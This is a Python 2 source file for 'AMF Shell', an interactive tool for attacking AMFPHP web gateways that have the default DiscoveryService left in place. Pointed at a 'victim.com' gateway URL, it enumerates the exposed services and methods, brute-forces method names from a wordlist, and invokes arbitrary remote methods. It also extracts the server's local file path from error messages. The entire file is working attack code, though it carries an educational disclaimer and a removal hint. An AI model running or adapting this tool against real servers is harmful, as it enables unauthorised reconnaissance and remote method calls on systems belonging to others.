#!/usr/bin/env python

"""
Action Message Format (AMF) Shell by George Hedfors

This testing tool demonstrates weaknesses in AMFPHP, especially where
the default service 'DiscoveryService' has been left behind.

WARNING:
This tool is made for educational purposes only and comes with no
warranties or guarantees that it will not break your environment.
"""

import sys
import cmd
from types import *

sys.path.append("pyamf/")
from pyamf.flex import ArrayCollection
from pyamf.remoting.client import RemotingService

currentClass = 'amfphp.DiscoveryService'
debug = 0

class cmdList(cmd.Cmd):
	intro = "Welcome to Action Message Formate Shell by George Hedfors. Type 'help' for command list.\n"

	def do_help(self, line):
		print "Available commands:"
		print "-----------------------"
		print "brute\t\t\t\tLaunch a method name brute force attack using"
		print "\t\t\t\tcommon names from common.txt"
		print "call methodName(args,..)\tCall a method from the current class. Arguments"
		print "\t\t\t\tmay be single arguments or arrays:"
		print "call methodName(['array','of','stuff'])"
		print "call methodName(arg1,arg2,arg3)"
		print "describe\t\t\tDescribe current class. Lists methods and args."
		print "describe_all\t\t\tLists methods and arguments from all classes"
		print "\t\t\t\tto output file."
		print "help\t\t\t\tWhere all the secrets are..."
		print "list\t\t\t\tLists available classes"
		print "use service.className\t\tChange current class"
		print

	def do_describe_all(self, line):
		output = "%s.txt" % sys.argv[1].split("/")[2]
		fp = open(output, "w")

		i = 0
		e = 0

		for item in serviceList:
			root = item['label']

			if item.has_key('children'):
				for child in item['children']:
					myClass = child['label']
					myService = "%s.%s" % (root, myClass)

					fp.write("%s\n" % myService)

					result = describeService(myService)

					if result != -1:
						if type(result[0]) is ListType:
							fp.write("\tIs accessible but did not return any usable methods.\n")
						else:
							for key in result[0].keys():
								fp.write("\t%s(%s)\n" % (key, ", ".join(result[0][key]['arguments'])))
								if result[0][key]['description'].find("No description") == -1: fp.write("\t- %s\n" % result[0][key]['description'])

						i += 1
					else:
						e += 1
			else:
				result = describeService(item['label'])
				fp.write("%s\n" % item['label'])

				if result != -1:
					if type(result[0]) is ListType:
						fp.write("\tIs accessible but did not return any usable methods.\n")
					else:
						for key in result[0].keys():
							fp.write("\t%s(%s)\n" % (key, ", ".join(result[0][key]['arguments'])))
							if result[0][key]['description'].find("No description") == -1: fp.write("\t- %s\n" % result[0][key]['description'])

					i += 1
				else:
					e += 1
			
		fp.close()

		print "Exported %d classes and methods to '%s'" % (i, output)
		print "%d error(s) cought" % e

	def do_describe(self, line):
		result = describeService(self.currentClass)

		printDebug(result)

		if result == -1:
			return

		print result[1]
		print "---------------"

		if hasattr(result, 'code'):
			printErr(result)
		else:
			if type(result[0]) is ListType:
				for item in result[0]:
					print item
			else:
				for key in result[0].keys():
					print "%s(%s) - %s" % (key, ", ".join(result[0][key]['arguments']), result[0][key]['description'])

	def do_brute(self, line):
		yesno = raw_input('This may seriously harm your environment, are you sure? (y/N): ')

		if yesno == 'y' or yesno == 'Y':
			file = open("common.txt", "r")
			lines = file.readlines()
			file.close()

			client = RemotingService(remoteUrl)
			service = client.getService(self.currentClass)

			print "Testing", len(lines), "methods..."

			for method in lines:
				testMethod = getattr(service, method.rstrip())
				
				try:
					result = testMethod()

					if hasattr(result, 'code'):
						if result.code != 'AMFPHP_INEXISTANT_METHOD':
							printErr(result)
					else:
						if type(result) is BooleanType:
							print "%s() returned: %s" % (method.rstrip(), result)
						else:
							print "%s() returned %d items" % (method.rstrip(), len(result))
				except Exception, e:
					print "%s(): %s" % (method.rstrip(), e)
					pass

	def do_list(self, line):
		for item in serviceList:
			printDebug(item)

			myClass = item['label']
			if item.has_key('children'):
				for child in item['children']:
					myMethod = child['label']
					print "%s.%s" % (myClass, myMethod)
			else:
				print item['label']

	def do_use(self, line):
		if line == '':
			print "syntax: use className\n"
			return 

		client = RemotingService(remoteUrl)
		service = client.getService(line)

		try:
			result = service.nosuchmethod()
		except Exception, e:
			print e
			return
		
		printDebug(result)

		if result.code != 'AMFPHP_INEXISTANT_METHOD':
			printErr(result)
		else:
			self.currentClass = line
			cmdList.prompt = "(%s) " % (line)

	def do_call(self, line):
		if line.find('(') == -1:
			print "syntax: call methodName(arg, ..)\n"
			return

		myMethod = line.split('(')[0]

		client = RemotingService(remoteUrl)
		service = client.getService(self.currentClass)
		targetMethod = getattr(service, myMethod)

		args = line.split('(')[1].split(')')[0]

		try:
			if len(args) > 0:
				if args.find('[') != -1:
					result = targetMethod(eval(args))
				else:
					result = targetMethod(*args.split(','))
			else:
				result = targetMethod()
		except Exception, e:
			print e
			return

		printDebug(result)

		if hasattr(result, 'code'):
			printErr(result)
		else:
			#printTree(result)
			dir(result)
			print result

	def do_exit(self, line):
		return True

	def do_EOF(self, line):
		return True

def describeService(myService):
		client = RemotingService(remoteUrl)
		service = client.getService('amfphp.DiscoveryService')

		toDescribe = {'data':'', 'label':"/".join(myService.split("."))}

		try:
			result = service.describeService(toDescribe)
		except Exception, e:
			print e
			return -1

		if hasattr(result, 'code'):
			printErr(result)
			return -1

		return result

def printErr(result):
	print result.description

def printTree(stack):
	if hasattr(stack, 'keys'):
		for key in stack.keys():
			if type(stack[key]) is UnicodeType:
				print key, "|", stack[key]
			else:
				printTree(stack[key])
	elif type(stack) is ListType:
		if len(stack) == 1:
			printTree(stack[0])
		else:
			for item in range(len(stack)):
				printTree(item)
	else:
		print stack

def printDebug(result):
	if debug > 0: print "[+] DEBUG:", result
	return

def getLocalPath(client):
	service = client.getService("nofile")
	dumb = service.nosuchservice()
	try:
		lpath = dumb.description.split('{')[2].split('}')[0].split('/')
		lpath.pop()
		localPath = "/".join(lpath)
	except:
		return False

	return localPath

if __name__ == '__main__':
	if len(sys.argv) < 2:
		print "syntax: %s http://victim.com/amfphp/gateway.php\n" % sys.argv[0]
		sys.exit(1)

	remoteUrl = sys.argv[1]

	try:
		cmdList.client = RemotingService(remoteUrl)
		localPath = getLocalPath(cmdList.client)
	except Exception, e:
		print e
		sys.exit()

	cmdList.service = cmdList.client.getService(currentClass)

	serviceList = cmdList.service.getServices()


	if hasattr(serviceList, 'code'):
		if result.code == 'AMFPHP_INEXISTANT_METHOD':
			print "[+] AMFPHP exists but appears not to be vulnerable to 'DiscoveryServices'. Listing services will not work.\n"
	else:
		print "[+] AMFPHP exists and appears to be vulnerable to 'DiscoveryService'."
		print "[*] To disable 'DiscoveryServices', remove %s/amfphp/DiscoveryService.php\n" % localPath

	cmdList.prompt = "(%s) " % (currentClass)
	cmdList.currentClass = currentClass
	cmdList.localPath = localPath
	cmdList().cmdloop()
